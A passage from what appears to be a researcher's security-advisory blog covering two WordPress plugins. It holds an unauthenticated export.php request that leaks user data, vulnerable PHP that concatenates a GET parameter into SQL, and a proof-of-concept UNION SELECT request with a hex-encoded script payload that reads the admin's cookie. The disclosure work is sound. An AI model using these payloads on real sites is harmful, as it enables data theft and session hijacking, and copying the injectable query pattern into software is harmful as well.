class="crayon-i">j_where</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-81"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0250 seconds] -->
<p>Here we see it takes in the &#8220;de&#8221;, &#8220;us&#8221;, and further get parameters and starts building up a SQL query to return. What we notice is that at no point so far have we seen any validation that the calling user is an admin. Also we notice that it checks the GET parameters &#8220;ip&#8221; and &#8220;ua&#8221;, which are used to toggle whether or not to return the IP and user agent information</p>
<p>Because of the lack of validation of the calling user, we can create an extremely simple request, which will export this data in clear text, including username, email, ip, and user agent.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa77ab334258356" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/gd-star-rating/export.php?ex=user&amp;de=article&amp;us=nor&amp;ip=on&amp;ua=on HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa77ab334258356-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa77ab334258356-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa77ab334258356-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">gd</span><span class="crayon-o">-</span><span class="crayon-i">star</span><span class="crayon-o">-</span><span class="crayon-i">rating</span><span class="crayon-o">/</span><span class="crayon-v">export</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">ex</span><span class="crayon-o">=</span><span class="crayon-i">user</span><span class="crayon-o">&amp;</span><span class="crayon-v">de</span><span class="crayon-o">=</span><span class="crayon-i">article</span><span class="crayon-o">&amp;</span><span class="crayon-v">us</span><span class="crayon-o">=</span><span class="crayon-i">nor</span><span class="crayon-o">&amp;</span><span class="crayon-v">ip</span><span class="crayon-o">=</span><span class="crayon-i">on</span><span class="crayon-o">&amp;</span><span class="crayon-v">ua</span><span class="crayon-o">=</span><span class="crayon-e">on </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa77ab334258356-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0021 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/gd-star-rating/" rel="tag">GD Star Rating</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/#respond" title="Comment on WordPress GD Star Rating information disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-39 -->

				
					
<article id="post-50" class="post-50 post type-post status-publish format-standard hentry category-advisories tag-flexi-quote-rotator tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/" title="7:59 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T19:59:53+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/" title="Permalink to WordPress Flexi Quote Rotator plugin multiple vulnerabilities" rel="bookmark">WordPress Flexi Quote Rotator plugin multiple vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49910/">Secunia Advisory SA 49910</a></p>
<p><strong>Analysis</strong><br />
The admin interface of the Flexi Quote Rotator plugin for WordPress implements a way for editing a quote through the displayManagementPage function in <a href="http://plugins.svn.wordpress.org/flexi-quote-rotator/tags/0.9/classes/quote-rotator-management.class.php">/classes/quote-rotator-management.class.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa7f35757188794" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function displayManagementPage()
{
	global $wpdb;
	
	echo "\t\t&lt;div class=\"wrap\"&gt;\n";
	if( $_GET['action']=='edit' )
	{
		$sql = "SELECT * FROM `" . $this-&gt;tableName . "` WHERE `id` = " . $_GET['id'];
		$results = $wpdb-&gt;get_results($sql);
		$r = $results[0];
		echo "\\t\\t\\t&lt;h2&gt;Edit Quote&lt;/h2&gt;\\n";
		echo "\\t\\t\\t&lt;form name=\"EditQuotesForm\" method=\"post\" action=\"?page=flexi-quote-rotator.php\"&gt;\\n";
		echo "\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\n";
		echo "\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/p&gt;\n";
		echo "\\t\\t\\t\\t&lt;table class=\"editform\" width=\"100%\" cellspacing=\"2\" cellpadding=\"5\"&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;tr&gt;\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"quote\"&gt;Quote:&lt;/label&gt;&lt;/th&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;textarea name=\"quote\" style=\"width:350px;height:200px;\"/&gt;".stripslashes($r-&gt;quote)."&lt;/textarea&gt;&lt;/td&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;/tr&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;tr&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"author\"&gt;Author:&lt;/label&gt;&lt;/th&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;input type=\"text\" name=\"author\" style=\"width:350px;\" value=\"".stripslashes($r-&gt;author)."\"/&gt;&lt;/td&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;/tr&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/table&gt;\n";
		echo "\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"editQuote\" value=\"1\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"id\" value=\"".$r-&gt;id."\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/p&gt;\\n";
		echo "\\t\\t\\t&lt;/form&gt;\\n";
	}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa7f35757188794-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f35757188794-32">32</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">displayManagementPage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\t\t&lt;div class=\"wrap\"&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'edit'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM `"</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-r">this</span><span class="crayon-o">-&gt;</span><span class="crayon-v">tableName</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"` WHERE `id` = "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">results</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">results</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;h2&gt;Edit Quote&lt;/h2&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;form name=\"EditQuotesForm\" method=\"post\" action=\"?page=flexi-quote-rotator.php\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/p&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;table class=\"editform\" width=\"100%\" cellspacing=\"2\" cellpadding=\"5\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;tr&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"quote\"&gt;Quote:&lt;/label&gt;&lt;/th&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;textarea name=\"quote\" style=\"width:350px;height:200px;\"/&gt;"</span><span class="crayon-sy">.</span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-i">quote</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"&lt;/textarea&gt;&lt;/td&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;/tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"author\"&gt;Author:&lt;/label&gt;&lt;/th&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;input type=\"text\" name=\"author\" style=\"width:350px;\" value=\""</span><span class="crayon-sy">.</span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-i">author</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\"/&gt;&lt;/td&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;/tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/table&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"editQuote\" value=\"1\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"id\" value=\""</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-v">id</span><span class="crayon-sy">.</span><span class="crayon-s">"\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/p&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7f35757188794-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;/form&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7f35757188794-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0087 seconds] -->
<p>It does so by checking the action GET parameter first. If it is &#8220;edit&#8221;, it will then concatenate the &#8220;id&#8221; GET parameter into a SQL query, and write the result out to the page. But because it does not correctly sanitize the &#8220;id&#8221; GET parameter, which causes a SQL injection. Also, this piece of code can be invoked without a nonce, which causes a CSRF vulnerability. Additionally, while it output-encodes the author and quote column, it does not encode the ID. This means we have two options for exploiting these 3 vulnerabilities:</p>
<ul>
<li>Chaining the SQL Injection and the XSS in order to execute javascript in the admins browser</li>
<li>Chaining the SQL Injection and the CSRF in order to execute arbitrary SQL blindly</li>
</ul>
<p>Here is an example of the former, where we trick the admin user into clicking on our specially crafted URL:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa7f47767258475" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-admin/tools.php?page=flexi-quote-rotator.php&amp;action=edit&amp;;id=3533 UNION SELECT 0x3122202f3e203c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e3c696e70757420747970653d2268696464656e22206e616d653d226964222076616c75653d2231, 2, 3 HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1342212499%7C2b307f49c397cbf2b578cc5df0902004; wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1342212499%7C8aec90b501bbc30db946f8f6bef9b9d8;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa7f47767258475-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7f47767258475-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa7f47767258475-3">3</div></div>
				</td>
